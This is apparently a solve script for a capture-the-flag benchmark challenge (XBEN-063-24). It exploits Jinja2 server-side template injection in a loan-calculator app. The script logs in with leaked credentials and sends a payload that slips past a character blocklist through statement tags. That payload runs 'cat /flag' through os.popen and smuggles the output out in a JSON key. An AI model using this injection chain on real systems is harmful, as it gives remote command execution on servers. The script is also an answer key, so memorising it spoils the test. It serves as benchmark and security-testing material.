#!/usr/bin/env bash
# XBEN-063-24 — Jinja2 SSTI through statement tags. Proxy-mode twin. Log in
# (test:test, leaked in an HTML comment). /total_loan_payments interpolates the
# `principal` value raw into a Jinja-rendered template. A blocklist rejects
# _ . [ ] {{ }} but NOT {% %}, so a {%set%}/{%print%} chain reaches os.popen;
# the output is smuggled through an injected JSON key and url-encoded to stay
# valid JSON.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben063p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/login' --set 'form.username=test' --set 'form.password=test' >/dev/null 2>&1 || true
PAYLOAD='1" ,"d": "{%set u="%c"|format(95)%}{%set g=u~u~"globals"~u~u%}{%set o=lipsum|attr(g)|attr("get")("os")%}{%print(o|attr("popen")("cat /flag")|attr("read")()|urlencode)%}'
out="$("$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/total_loan_payments' \
  --set "query.principal=$PAYLOAD" --set 'query.payment=212.47' --set 'query.term=60' 2>/dev/null)"
# The flag is url-encoded in the injected JSON key; pull it out and decode it.
enc="$(grep -oE 'FLAG%7[Bb][^"%]*%7[Dd]' <<<"$out" | head -1)"
if [ -n "$enc" ]; then
  python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" "$enc"
else
  print_flag
fi
